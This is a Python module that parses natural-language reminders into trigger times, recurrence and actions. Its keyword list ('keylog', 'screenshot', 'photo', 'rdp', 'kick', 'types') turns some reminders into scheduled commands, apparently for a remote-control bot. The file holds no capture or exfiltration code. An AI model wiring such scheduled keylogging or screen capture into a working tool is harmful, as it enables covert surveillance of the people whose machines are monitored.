import re
from datetime import datetime, timedelta


def get_local_timezone():
    return datetime.now().astimezone().tzinfo


def _extract_time_string(text: str):
    return text.strip().lower()


def parse_time_string(time_text: str, base_time: datetime):
    print(f"Parsing time string: '{time_text}' with base time {base_time}")
    time_text = time_text.strip().lower()
    hour = 0
    minute = 0
    ampm_match = re.search(r"(am|pm)$", time_text)
    if ampm_match:
        time_text = time_text.replace(ampm_match.group(1), "").strip()
        parts = time_text.split(":")
        hour = int(parts[0])
        minute = int(parts[1]) if len(parts) > 1 else 0
        if ampm_match.group(1) == "pm" and hour != 12:
            hour += 12
        if ampm_match.group(1) == "am" and hour == 12:
            hour = 0
    else:
        parts = time_text.split(":")
        hour = int(parts[0])
        minute = int(parts[1]) if len(parts) > 1 else 0
    return base_time.replace(hour=hour, minute=minute, second=0, microsecond=0)


def _normalize_message(text: str):
    clean = re.sub(
        r"^.*?\b(?:remind me|send me)(?: to| about)?\s*", "", text, flags=re.IGNORECASE
    )
    clean = re.sub(
        r"\s+((at|in|tomorrow|daily|every|on)\b).*", "", clean, flags=re.IGNORECASE
    )
    clean = clean.strip()
    return clean if clean else "Reminder"


def parse_reminder_input(text: str):
    now = datetime.now().astimezone()
    lower_text = text.strip().lower()
    reminder_text = _normalize_message(text)
    action_type = "send_message"
    action_params = {}
    recurrence_pattern = None
    is_one_time = True
    trigger_time = now

    in_match = re.search(
        r"in\s+(\d+)\s*(minute|minutes|hour|hours|day|days)", lower_text
    )
    if in_match:
        value = int(in_match.group(1))
        unit = in_match.group(2)
        if "hour" in unit:
            trigger_time = now + timedelta(hours=value)
        elif "minute" in unit:
            trigger_time = now + timedelta(minutes=value)
        else:
            trigger_time = now + timedelta(days=value)
    elif "tomorrow" in lower_text:
        tomorrow = now + timedelta(days=1)
        time_match = re.search(r"at\s+(\d{1,2}(?::\d{2})?\s*(?:am|pm)?)", lower_text)
        if time_match:
            trigger_time = parse_time_string(time_match.group(1), tomorrow)
        else:
            trigger_time = tomorrow.replace(hour=9, minute=0, second=0, microsecond=0)
    else:
        weekly_match = re.search(
            r"every\s+(monday|tuesday|wednesday|thursday|friday|saturday|sunday)\b",
            lower_text,
        )
        if weekly_match:
            recurrence_pattern = weekly_match.group(1)
            is_one_time = False
        elif re.search(r"\b(daily|every day|everyday)\b", lower_text):
            recurrence_pattern = "daily"
            is_one_time = False

        time_match = re.search(r"at\s+(\d{1,2}(?::\d{2})?\s*(?:am|pm)?)", lower_text)
        if time_match:
            if recurrence_pattern is not None:
                base = now
            else:
                base = (
                    now
                    if now < parse_time_string(time_match.group(1), now)
                    else now + timedelta(days=1)
                )
            trigger_time = parse_time_string(time_match.group(1), base)
        else:
            if recurrence_pattern is not None:
                trigger_time = now
            else:
                fallback_match = re.search(
                    r"(\d{1,2}(?::\d{2})?\s*(?:am|pm))", lower_text
                )
                if fallback_match:
                    trigger_time = parse_time_string(fallback_match.group(1), now)
                else:
                    trigger_time = now + timedelta(minutes=1)

    if recurrence_pattern is not None and recurrence_pattern in [
        "monday",
        "tuesday",
        "wednesday",
        "thursday",
        "friday",
        "saturday",
        "sunday",
    ]:
        recurrence_pattern = recurrence_pattern.lower()
    if recurrence_pattern == "every day":
        recurrence_pattern = "daily"
    if recurrence_pattern == "everyday":
        recurrence_pattern = "daily"

    command_keywords = [
        "screenshot",
        "video",
        "screen",
        "photo",
        "keylog",
        "list",
        "kick",
        "rdp",
        "types",
        "send",
    ]
    normalized_lower = reminder_text.lower()
    for keyword in command_keywords:
        if normalized_lower.startswith(keyword) or keyword in normalized_lower.split():
            action_type = "run_command"
            if keyword == "types":
                action_params["command"] = (
                    f"types {reminder_text[len(keyword):].strip()}"
                )
            elif keyword == "send" and reminder_text.lower().startswith("send "):
                action_params["command"] = f"send {reminder_text[5:].strip()}"
            else:
                action_params["command"] = reminder_text
            break

    return {
        "trigger_time": trigger_time,
        "message": reminder_text,
        "action_type": action_type,
        "action_params": action_params,
        "recurrence_pattern": recurrence_pattern,
        "is_one_time": is_one_time,
    }
